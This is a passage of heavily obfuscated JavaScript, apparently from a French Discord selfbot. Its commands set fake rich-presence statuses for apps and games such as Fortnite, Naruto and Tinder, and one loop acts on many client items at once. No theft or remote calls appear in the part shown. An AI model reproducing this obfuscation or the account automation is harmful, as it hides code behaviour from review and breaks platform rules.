rpcGenerator[(_0x3c5618(0x6a4))]()['setName']('Facebook')[_0x3c5618(0x432)]('https://www.twitch.tv/hml_cp0')[_0x3c5618(0x2f4)](_0x3c5618(0x3dd))['setApplicationId'](_0x3c5618(0x281))[_0x3c5618(0x685)](_0x3c5618(0x309))[_0x3c5618(0x231)](_0x358490['id'])[_0x3c5618(0x62f)](_0x3c5618(0x4f3))[_0x3c5618(0x204)](_0x2f2f39)[_0x3c5618(0x458)](Date[_0x3c5618(0x51b)]())[_0x3c5618(0x2d8)]({'id':uuid()});client[_0x3c5618(0x377)][_0x3c5618(0x695)](_0x24f99a['toDiscord']())['catch'](console['error']),console[_0x3c5618(0x32b)]('╟\x20Commande\x20Facebook\x20executé'),console[_0x3c5618(0x32b)](_0x3c5618(0x59d)),_0x35b0b3[_0x3c5618(0x26f)](':white_check_mark:\x20**Tu\x20regardes\x20'+_0x2f2f39+_0x3c5618(0x46d));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x557))){let _0x671ea9='';_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x213)),client[_0x8a5b4f(0x608)][_0x8a5b4f(0x1e7)](_0x36cdb3=>_0x36cdb3[_0x8a5b4f(0x578)]()[_0x8a5b4f(0x4d5)](_0x671ea9=_0x8a5b4f(0x35a))),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x34c)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x1eb)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x52a))){let _0x59f1e5=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),_0x8a5b4f(0x52a))['then'](_0x1199a3=>{const _0x206bf1=_0x8a5b4f;let _0x4f4839=new rpcGenerator[(_0x206bf1(0x6a4))]()[_0x206bf1(0x35f)](_0x206bf1(0x5fe))[_0x206bf1(0x432)](_0x206bf1(0x430))[_0x206bf1(0x2f4)](_0x206bf1(0x3dd))['setApplicationId'](_0x206bf1(0x281))['setDetails'](_0x206bf1(0x5fe))[_0x206bf1(0x231)](_0x1199a3['id'])[_0x206bf1(0x62f)](_0x206bf1(0x4f3))[_0x206bf1(0x204)](_0x59f1e5)[_0x206bf1(0x458)](Date['now']())['setParty']({'id':uuid()});client[_0x206bf1(0x377)][_0x206bf1(0x695)](_0x4f4839[_0x206bf1(0x694)]())[_0x206bf1(0x4d5)](console[_0x206bf1(0x55f)]),console[_0x206bf1(0x32b)]('╟\x20Commande\x20tiktok\x20executé'),console[_0x206bf1(0x32b)](_0x206bf1(0x59d)),_0x35b0b3[_0x206bf1(0x26f)](_0x206bf1(0x6d7)+_0x59f1e5+_0x206bf1(0x1cd));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x692))){let _0x5ec0a2=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉';rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),'twitter')[_0x8a5b4f(0x1d9)](_0x400704=>{const _0x9e64c8=_0x8a5b4f;let _0xbff9d=new rpcGenerator['Rpc']()[_0x9e64c8(0x35f)](_0x9e64c8(0x271))[_0x9e64c8(0x432)](_0x9e64c8(0x414))['setType'](_0x9e64c8(0x3dd))[_0x9e64c8(0x4c5)](_0x9e64c8(0x281))[_0x9e64c8(0x685)](_0x9e64c8(0x271))['setAssetsLargeImage'](_0x400704['id'])[_0x9e64c8(0x62f)](_0x9e64c8(0x4f3))[_0x9e64c8(0x204)](_0x5ec0a2)['setStartTimestamp'](Date[_0x9e64c8(0x51b)]())[_0x9e64c8(0x2d8)]({'id':uuid()});client[_0x9e64c8(0x377)][_0x9e64c8(0x695)](_0xbff9d[_0x9e64c8(0x694)]())[_0x9e64c8(0x4d5)](console['error']),console[_0x9e64c8(0x32b)](_0x9e64c8(0x412)),console[_0x9e64c8(0x32b)](_0x9e64c8(0x59d)),_0x35b0b3['edit'](_0x9e64c8(0x6d7)+_0x5ec0a2+'\x20sur\x20Twitter**');});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x50c))){let _0x51fa57=_0x106d51[_0x8a5b4f(0x217)](0x1)['join']('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),_0x8a5b4f(0x50c))[_0x8a5b4f(0x1d9)](_0x2806f8=>{const _0x1d1152=_0x8a5b4f;let _0x327ecb=new rpcGenerator[(_0x1d1152(0x6a4))]()[_0x1d1152(0x35f)](_0x1d1152(0x312))['setUrl'](_0x1d1152(0x430))[_0x1d1152(0x2f4)](_0x1d1152(0x3dd))['setApplicationId'](_0x1d1152(0x281))[_0x1d1152(0x685)](_0x1d1152(0x312))[_0x1d1152(0x231)](_0x2806f8['id'])['setAssetsLargeText'](_0x1d1152(0x4f3))[_0x1d1152(0x204)](_0x51fa57)[_0x1d1152(0x458)](Date[_0x1d1152(0x51b)]())[_0x1d1152(0x2d8)]({'id':uuid()});client[_0x1d1152(0x377)][_0x1d1152(0x695)](_0x327ecb[_0x1d1152(0x694)]())[_0x1d1152(0x4d5)](console['error']),console[_0x1d1152(0x32b)](_0x1d1152(0x328)),console[_0x1d1152(0x32b)](_0x1d1152(0x59d)),_0x35b0b3[_0x1d1152(0x26f)](_0x1d1152(0x6d7)+_0x51fa57+_0x1d1152(0x2cd));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x5a3))){let _0x300ddd=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),_0x8a5b4f(0x5a3))[_0x8a5b4f(0x1d9)](_0x364ce5=>{const _0x3773dd=_0x8a5b4f;let _0x3e4485=new rpcGenerator[(_0x3773dd(0x6a4))]()[_0x3773dd(0x35f)](_0x3773dd(0x673))['setUrl'](_0x3773dd(0x430))[_0x3773dd(0x2f4)](_0x3773dd(0x3dd))['setApplicationId'](_0x3773dd(0x281))[_0x3773dd(0x685)](_0x3773dd(0x673))['setAssetsLargeImage'](_0x364ce5['id'])[_0x3773dd(0x62f)](_0x3773dd(0x4f3))[_0x3773dd(0x204)](_0x300ddd)[_0x3773dd(0x458)](Date[_0x3773dd(0x51b)]())[_0x3773dd(0x2d8)]({'id':uuid()});client[_0x3773dd(0x377)]['setPresence'](_0x3e4485[_0x3773dd(0x694)]())[_0x3773dd(0x4d5)](console[_0x3773dd(0x55f)]),console[_0x3773dd(0x32b)](_0x3773dd(0x380)),console[_0x3773dd(0x32b)](_0x3773dd(0x59d)),_0x35b0b3[_0x3773dd(0x26f)](_0x3773dd(0x6d7)+_0x300ddd+_0x3773dd(0x68f));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x400))){let _0x5df2d4=_0x106d51[_0x8a5b4f(0x217)](0x2)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),_0x8a5b4f(0x4f8))['then'](_0x164ba4=>{const _0x5086e3=_0x8a5b4f;let _0x2d2114=new rpcGenerator[(_0x5086e3(0x6a4))]()[_0x5086e3(0x35f)]('Tokyo\x20Ghoul')[_0x5086e3(0x432)]('https://www.twitch.tv/codezero_two_')[_0x5086e3(0x2f4)](_0x5086e3(0x3dd))['setApplicationId'](_0x5086e3(0x281))['setDetails'](_0x5086e3(0x648))[_0x5086e3(0x231)](_0x164ba4['id'])['setAssetsLargeText'](_0x5086e3(0x4f3))['setState'](_0x5df2d4)['setStartTimestamp'](Date['now']())['setParty']({'id':uuid()});client[_0x5086e3(0x377)][_0x5086e3(0x695)](_0x2d2114[_0x5086e3(0x694)]())[_0x5086e3(0x4d5)](console[_0x5086e3(0x55f)]),console[_0x5086e3(0x32b)](_0x5086e3(0x375)),console[_0x5086e3(0x32b)](_0x5086e3(0x59d)),_0x35b0b3[_0x5086e3(0x26f)](':white_check_mark:\x20**Tu\x20regardes\x20'+_0x5df2d4+'\x20sur\x20Tokyo\x20Ghoul**');});}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x45a))){let _0xcec3fe=_0x106d51[_0x8a5b4f(0x217)](0x3)['join']('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉';rpcGenerator[_0x8a5b4f(0x5d9)]('603405368940429315','hxh')['then'](_0x462bf7=>{const _0x80ee61=_0x8a5b4f;let _0x304140=new rpcGenerator[(_0x80ee61(0x6a4))]()['setName'](_0x80ee61(0x221))['setUrl']('https://www.twitch.tv/codezero_two_')[_0x80ee61(0x2f4)](_0x80ee61(0x3dd))[_0x80ee61(0x4c5)]('603405368940429315')[_0x80ee61(0x685)](_0x80ee61(0x221))[_0x80ee61(0x231)](_0x462bf7['id'])['setAssetsLargeText'](_0x80ee61(0x4f3))[_0x80ee61(0x204)](_0xcec3fe)['setStartTimestamp'](Date['now']())[_0x80ee61(0x2d8)]({'id':uuid()});client[_0x80ee61(0x377)][_0x80ee61(0x695)](_0x304140[_0x80ee61(0x694)]())[_0x80ee61(0x4d5)](console[_0x80ee61(0x55f)]),console[_0x80ee61(0x32b)](_0x80ee61(0x4b8)),console[_0x80ee61(0x32b)](_0x80ee61(0x59d)),_0x35b0b3['edit'](_0x80ee61(0x6d7)+_0xcec3fe+'\x20sur\x20Hunter\x20X\x20Hunter**');});}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x33c))){let _0x5c58eb=_0x106d51['splice'](0x1)[_0x8a5b4f(0x565)]('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉';rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),_0x8a5b4f(0x33c))[_0x8a5b4f(0x1d9)](_0x6d3475=>{const _0x1a4411=_0x8a5b4f;let _0xc3af15=new rpcGenerator['Rpc']()[_0x1a4411(0x35f)]('Naruto')[_0x1a4411(0x432)](_0x1a4411(0x414))[_0x1a4411(0x2f4)](_0x1a4411(0x3dd))['setApplicationId'](_0x1a4411(0x281))[_0x1a4411(0x685)](_0x1a4411(0x596))[_0x1a4411(0x231)](_0x6d3475['id'])[_0x1a4411(0x62f)](_0x1a4411(0x4f3))[_0x1a4411(0x204)](_0x5c58eb)['setStartTimestamp'](Date[_0x1a4411(0x51b)]())[_0x1a4411(0x2d8)]({'id':uuid()});client[_0x1a4411(0x377)]['setPresence'](_0xc3af15['toDiscord']())[_0x1a4411(0x4d5)](console[_0x1a4411(0x55f)]),console[_0x1a4411(0x32b)](_0x1a4411(0x38a)),console[_0x1a4411(0x32b)]('╟─────────────────────────────────╢'),_0x35b0b3[_0x1a4411(0x26f)](_0x1a4411(0x6d7)+_0x5c58eb+'\x20sur\x20Naruto**');});}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x411))){let _0x2a67c8=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),_0x8a5b4f(0x411))['then'](_0x3c1b1d=>{const _0x19b138=_0x8a5b4f;let _0x5204ae=new rpcGenerator[(_0x19b138(0x6a4))]()[_0x19b138(0x35f)](_0x19b138(0x5f9))['setUrl'](_0x19b138(0x414))[_0x19b138(0x2f4)](_0x19b138(0x3dd))[_0x19b138(0x4c5)]('603405368940429315')[_0x19b138(0x685)]('Pornhub')[_0x19b138(0x231)](_0x3c1b1d['id'])[_0x19b138(0x62f)](_0x19b138(0x4f3))['setState'](_0x2a67c8)[_0x19b138(0x458)](Date[_0x19b138(0x51b)]())['setParty']({'id':uuid()});client[_0x19b138(0x377)][_0x19b138(0x695)](_0x5204ae[_0x19b138(0x694)]())['catch'](console[_0x19b138(0x55f)]),console[_0x19b138(0x32b)](_0x19b138(0x5ce)),console[_0x19b138(0x32b)](_0x19b138(0x59d)),_0x35b0b3[_0x19b138(0x26f)](_0x19b138(0x6d7)+_0x2a67c8+'\x20sur\x20Pornhub**');});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+'clash\x20of\x20clan')){let _0x2ff7fb=_0x106d51[_0x8a5b4f(0x217)](0x3)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)]('721465320740487179','clash-of-clans-app-icon')[_0x8a5b4f(0x1d9)](_0x320f9f=>{const _0x2f5e6f=_0x8a5b4f;let _0xd02993=new rpcGenerator[(_0x2f5e6f(0x6a4))]()[_0x2f5e6f(0x35f)](_0x2f5e6f(0x525))[_0x2f5e6f(0x432)](_0x2f5e6f(0x430))['setType'](_0x2f5e6f(0x568))['setApplicationId'](_0x2f5e6f(0x42c))[_0x2f5e6f(0x685)](_0x2f5e6f(0x4f3))['setAssetsLargeImage'](_0x320f9f['id'])[_0x2f5e6f(0x62f)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x2f5e6f(0x204)](_0x2ff7fb)['setStartTimestamp'](Date['now']())[_0x2f5e6f(0x2d8)]({'id':uuid()});client[_0x2f5e6f(0x377)][_0x2f5e6f(0x695)](_0xd02993['toDiscord']())[_0x2f5e6f(0x4d5)](console[_0x2f5e6f(0x55f)]),console[_0x2f5e6f(0x32b)](_0x2f5e6f(0x2b2)),console[_0x2f5e6f(0x32b)]('╟─────────────────────────────────╢'),_0x35b0b3[_0x2f5e6f(0x26f)](_0x2f5e6f(0x642)+_0x2ff7fb+_0x2f5e6f(0x637));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+'minecraft')){let _0x415bec=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉';rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),'minecraft')[_0x8a5b4f(0x1d9)](_0x5cb12b=>{const _0x50b8ce=_0x8a5b4f;let _0xfdd737=new rpcGenerator[(_0x50b8ce(0x6a4))]()[_0x50b8ce(0x35f)]('Minecraft')[_0x50b8ce(0x432)](_0x50b8ce(0x430))[_0x50b8ce(0x2f4)](_0x50b8ce(0x568))['setApplicationId'](_0x50b8ce(0x281))[_0x50b8ce(0x685)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x50b8ce(0x231)](_0x5cb12b['id'])['setAssetsLargeText']('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x50b8ce(0x204)](_0x415bec)[_0x50b8ce(0x458)](Date[_0x50b8ce(0x51b)]())[_0x50b8ce(0x2d8)]({'id':uuid()});client[_0x50b8ce(0x377)][_0x50b8ce(0x695)](_0xfdd737['toDiscord']())[_0x50b8ce(0x4d5)](console[_0x50b8ce(0x55f)]),console[_0x50b8ce(0x32b)](_0x50b8ce(0x6d8)),console[_0x50b8ce(0x32b)](_0x50b8ce(0x59d)),_0x35b0b3[_0x50b8ce(0x26f)](':white_check_mark:\x20**Tu\x20joues\x20à\x20'+_0x415bec+_0x50b8ce(0x390));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x523))){let _0x48409f=_0x106d51[_0x8a5b4f(0x217)](0x2)[_0x8a5b4f(0x565)]('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉';rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),_0x8a5b4f(0x3fd))['then'](_0x1f8233=>{const _0x2aff12=_0x8a5b4f;let _0x1a5a5e=new rpcGenerator['Rpc']()[_0x2aff12(0x35f)]('Clash\x20Royal')['setUrl'](_0x2aff12(0x430))['setType']('PLAYING')[_0x2aff12(0x4c5)](_0x2aff12(0x281))[_0x2aff12(0x685)](_0x2aff12(0x4f3))[_0x2aff12(0x231)](_0x1f8233['id'])[_0x2aff12(0x62f)](_0x2aff12(0x4f3))[_0x2aff12(0x204)](_0x48409f)['setStartTimestamp'](Date['now']())['setParty']({'id':uuid()});client[_0x2aff12(0x377)][_0x2aff12(0x695)](_0x1a5a5e[_0x2aff12(0x694)]())[_0x2aff12(0x4d5)](console[_0x2aff12(0x55f)]),console[_0x2aff12(0x32b)](_0x2aff12(0x2fd)),console[_0x2aff12(0x32b)](_0x2aff12(0x59d)),_0x35b0b3[_0x2aff12(0x26f)](_0x2aff12(0x642)+_0x48409f+'\x20sur\x20Clash\x20Royal**');});}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+'tinder')){let _0x5ddad1=_0x106d51['splice'](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),_0x8a5b4f(0x4a7))[_0x8a5b4f(0x1d9)](_0x3e5377=>{const _0x12c523=_0x8a5b4f;let _0x457a96=new rpcGenerator[(_0x12c523(0x6a4))]()['setName'](_0x12c523(0x273))[_0x12c523(0x432)](_0x12c523(0x414))[_0x12c523(0x2f4)](_0x12c523(0x568))['setApplicationId']('603405368940429315')[_0x12c523(0x685)](_0x12c523(0x4f3))[_0x12c523(0x231)](_0x3e5377['id'])[_0x12c523(0x62f)](_0x12c523(0x4f3))[_0x12c523(0x204)](_0x5ddad1)[_0x12c523(0x458)](Date[_0x12c523(0x51b)]())[_0x12c523(0x2d8)]({'id':uuid()});client[_0x12c523(0x377)]['setPresence'](_0x457a96[_0x12c523(0x694)]())[_0x12c523(0x4d5)](console['error']),console[_0x12c523(0x32b)]('╟\x20Commande\x20tinder\x20executé'),console[_0x12c523(0x32b)](_0x12c523(0x59d)),_0x35b0b3[_0x12c523(0x26f)](_0x12c523(0x642)+_0x5ddad1+_0x12c523(0x2c2));});}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x57a))){let _0x1ae0ec=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator['getRpcImage'](_0x8a5b4f(0x281),_0x8a5b4f(0x57a))['then'](_0x56cb88=>{const _0x33fb15=_0x8a5b4f;let _0x987021=new rpcGenerator[(_0x33fb15(0x6a4))]()[_0x33fb15(0x35f)](_0x33fb15(0x2e4))[_0x33fb15(0x432)](_0x33fb15(0x430))[_0x33fb15(0x2f4)](_0x33fb15(0x568))[_0x33fb15(0x4c5)]('603405368940429315')[_0x33fb15(0x685)](_0x33fb15(0x4f3))[_0x33fb15(0x231)](_0x56cb88['id'])[_0x33fb15(0x62f)](_0x33fb15(0x4f3))[_0x33fb15(0x204)](_0x1ae0ec)['setStartTimestamp'](Date[_0x33fb15(0x51b)]())['setParty']({'id':uuid()});client[_0x33fb15(0x377)][_0x33fb15(0x695)](_0x987021[_0x33fb15(0x694)]())[_0x33fb15(0x4d5)](console['error']),console[_0x33fb15(0x32b)](_0x33fb15(0x6b0)),console[_0x33fb15(0x32b)]('╟─────────────────────────────────╢'),_0x35b0b3[_0x33fb15(0x26f)](_0x33fb15(0x642)+_0x1ae0ec+_0x33fb15(0x2f9));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x1df))){let _0x14647b=_0x106d51['splice'](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)]('603405368940429315',_0x8a5b4f(0x1df))[_0x8a5b4f(0x1d9)](_0x186ee0=>{const _0x19eb9d=_0x8a5b4f;let _0x3dc51a=new rpcGenerator[(_0x19eb9d(0x6a4))]()[_0x19eb9d(0x35f)](_0x19eb9d(0x256))[_0x19eb9d(0x432)]('https://www.twitch.tv/hml_cp0')['setType'](_0x19eb9d(0x568))[_0x19eb9d(0x4c5)]('603405368940429315')[_0x19eb9d(0x685)](_0x19eb9d(0x4f3))[_0x19eb9d(0x231)](_0x186ee0['id'])[_0x19eb9d(0x62f)](_0x19eb9d(0x4f3))[_0x19eb9d(0x204)](_0x14647b)[_0x19eb9d(0x458)](Date['now']())[_0x19eb9d(0x2d8)]({'id':uuid()});client['user'][_0x19eb9d(0x695)](_0x3dc51a[_0x19eb9d(0x694)]())[_0x19eb9d(0x4d5)](console[_0x19eb9d(0x55f)]),console['log']('╟\x20Commande\x20Badlion'),console[_0x19eb9d(0x32b)]('╟─────────────────────────────────╢'),_0x35b0b3[_0x19eb9d(0x26f)](':white_check_mark:\x20**Tu\x20joues\x20à\x20'+_0x14647b+_0x19eb9d(0x1d1));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x560))){let _0x42771b=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator['getRpcImage']('603405368940429315',_0x8a5b4f(0x560))[_0x8a5b4f(0x1d9)](_0x250ea8=>{const _0x2fb2d0=_0x8a5b4f;let _0x8f47fc=new rpcGenerator[(_0x2fb2d0(0x6a4))]()[_0x2fb2d0(0x35f)](_0x2fb2d0(0x385))[_0x2fb2d0(0x432)](_0x2fb2d0(0x414))['setType'](_0x2fb2d0(0x568))['setApplicationId']('603405368940429315')[_0x2fb2d0(0x685)](_0x2fb2d0(0x4f3))[_0x2fb2d0(0x231)](_0x250ea8['id'])[_0x2fb2d0(0x62f)](_0x2fb2d0(0x4f3))[_0x2fb2d0(0x204)](_0x42771b)[_0x2fb2d0(0x458)](Date[_0x2fb2d0(0x51b)]())['setParty']({'id':uuid()});client[_0x2fb2d0(0x377)][_0x2fb2d0(0x695)](_0x8f47fc['toDiscord']())[_0x2fb2d0(0x4d5)](console[_0x2fb2d0(0x55f)]),console['log'](_0x2fb2d0(0x66a)),console[_0x2fb2d0(0x32b)](_0x2fb2d0(0x59d)),_0x35b0b3[_0x2fb2d0(0x26f)](_0x2fb2d0(0x642)+_0x42771b+_0x2fb2d0(0x53d));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x570))){let _0x398c3a=_0x106d51['splice'](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator['getRpcImage'](_0x8a5b4f(0x281),'csgo')[_0x8a5b4f(0x1d9)](_0x59b816=>{const _0x5bc4fb=_0x8a5b4f;let _0x2502a4=new rpcGenerator['Rpc']()[_0x5bc4fb(0x35f)]('Counter\x20Strike')[_0x5bc4fb(0x432)](_0x5bc4fb(0x414))[_0x5bc4fb(0x2f4)](_0x5bc4fb(0x568))['setApplicationId']('603405368940429315')['setDetails'](_0x5bc4fb(0x4f3))[_0x5bc4fb(0x231)](_0x59b816['id'])[_0x5bc4fb(0x62f)](_0x5bc4fb(0x4f3))[_0x5bc4fb(0x204)](_0x398c3a)[_0x5bc4fb(0x458)](Date[_0x5bc4fb(0x51b)]())[_0x5bc4fb(0x2d8)]({'id':uuid()});client[_0x5bc4fb(0x377)][_0x5bc4fb(0x695)](_0x2502a4['toDiscord']())['catch'](console[_0x5bc4fb(0x55f)]),console['log'](_0x5bc4fb(0x38d)),console[_0x5bc4fb(0x32b)]('╟─────────────────────────────────╢'),_0x35b0b3['edit'](':white_check_mark:\x20**Tu\x20joues\x20à\x20'+_0x398c3a+_0x5bc4fb(0x669));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+'among\x20us')){let _0x15cf35=_0x106d51['splice'](0x2)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),'amongus')[_0x8a5b4f(0x1d9)](_0x355dbd=>{const _0x483cf2=_0x8a5b4f;let _0x27cafd=new rpcGenerator['Rpc']()['setName']('Among\x20us')[_0x483cf2(0x432)](_0x483cf2(0x430))[_0x483cf2(0x2f4)]('PLAYING')['setApplicationId']('603405368940429315')['setDetails'](_0x483cf2(0x4f3))[_0x483cf2(0x231)](_0x355dbd['id'])[_0x483cf2(0x62f)](_0x483cf2(0x4f3))['setState'](_0x15cf35)['setStartTimestamp'](Date['now']())['setParty']({'id':uuid()});client[_0x483cf2(0x377)]['setPresence'](_0x27cafd[_0x483cf2(0x694)]())[_0x483cf2(0x4d5)](console['error']),console[_0x483cf2(0x32b)](_0x483cf2(0x269)),console[_0x483cf2(0x32b)]('╟─────────────────────────────────╢'),_0x35b0b3[_0x483cf2(0x26f)](_0x483cf2(0x642)+_0x15cf35+'\x20sur\x20among\x20us**');});}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x494))){let _0x6c7427=_0x106d51['splice'](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),'fortnite')[_0x8a5b4f(0x1d9)](_0x5488ef=>{const _0x1fe192=_0x8a5b4f;let _0x2fd948=new rpcGenerator['Rpc']()['setName'](_0x1fe192(0x69c))[_0x1fe192(0x432)](_0x1fe192(0x430))['setType']('PLAYING')[_0x1fe192(0x4c5)]('603405368940429315')['setDetails'](_0x1fe192(0x4f3))[_0x1fe192(0x231)](_0x5488ef['id'])[_0x1fe192(0x62f)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x1fe192(0x204)](_0x6c7427)[_0x1fe192(0x458)](Date[_0x1fe192(0x51b)]())[_0x1fe192(0x2d8)]({'id':uuid()});client[_0x1fe192(0x377)][_0x1fe192(0x695)](_0x2fd948[_0x1fe192(0x694)]())['catch'](console['error']),console[_0x1fe192(0x32b)](_0x1fe192(0x3f1)),console[_0x1fe192(0x32b)](_0x1fe192(0x59d)),_0x35b0b3[_0x1fe192(0x26f)](_0x1fe192(0x642)+_0x6c7427+_0x1fe192(0x52f));});}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x47b))){let _0x24f651=_0x106d51[_0x8a5b4f(0x217)](0x2)[_0x8a5b4f(0x565)]('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉';rpcGenerator[_0x8a5b4f(0x5d9)]('603405368940429315',_0x8a5b4f(0x588))[_0x8a5b4f(0x1d9)](_0x211fef=>{const _0x5a3e94=_0x8a5b4f;let _0x21bd68=new rpcGenerator[(_0x5a3e94(0x6a4))]()[_0x5a3e94(0x35f)](_0x5a3e94(0x3ca))[_0x5a3e94(0x432)](_0x5a3e94(0x430))[_0x5a3e94(0x2f4)](_0x5a3e94(0x568))[_0x5a3e94(0x4be)](_0x5a3e94(0x454))['setPartyId']('ae488379-351d-4a4f-ad32-2b9b01c91657')['setApplicationId']('603405368940429315')[_0x5a3e94(0x685)](_0x5a3e94(0x4f3))[_0x5a3e94(0x231)](_0x211fef['id'])['setAssetsLargeText']('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x5a3e94(0x204)](_0x24f651)[_0x5a3e94(0x458)](Date[_0x5a3e94(0x51b)]())[_0x5a3e94(0x2d8)]({'id':uuid()});client[_0x5a3e94(0x377)][_0x5a3e94(0x695)](_0x21bd68[_0x5a3e94(0x694)]())[_0x5a3e94(0x4d5)](console[_0x5a3e94(0x55f)]),console['log'](_0x5a3e94(0x524)),console[_0x5a3e94(0x32b)](_0x5a3e94(0x59d)),_0x35b0b3[_0x5a3e94(0x26f)](_0x5a3e94(0x642)+_0x24f651+_0x5a3e94(0x23d));});}if(_0x5e9f52['content']===prefix+'channels\x20list'){if(!_0x5e9f52[_0x8a5b4f(0x5e1)])return _0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Commande\x20uniquement\x20utilisable\x20sur\x20un\x20serveur**');if(!_0x35b0b3['member']['hasPermission'](_0x8a5b4f(0x577)))return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x681)+_0x49306a['map'](_0x3c4a40=>_0x3c4a40[_0x8a5b4f(0x47a)]));const _0x49306a=_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e6)];var _0x20ea1c=new 